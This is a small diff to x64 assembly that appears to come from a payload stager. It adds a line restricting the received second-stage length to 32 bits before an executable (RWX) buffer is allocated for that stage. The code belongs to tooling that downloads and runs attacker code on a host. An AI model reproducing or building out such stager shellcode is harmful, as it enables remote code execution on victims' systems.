@@ -24,6 +24,7 @@ recv:
   add rsp, 32            ; we restore RSP from the api_call so we can pop off RSI next
   ; Alloc a RWX buffer for the second stage
   pop rsi                ; pop off the second stage length
+  mov esi, esi           ; only use the lower-order 32 bits for the size
   push byte 0x40         ; 
   pop r9                 ; PAGE_EXECUTE_READWRITE
   push 0x1000            ; 
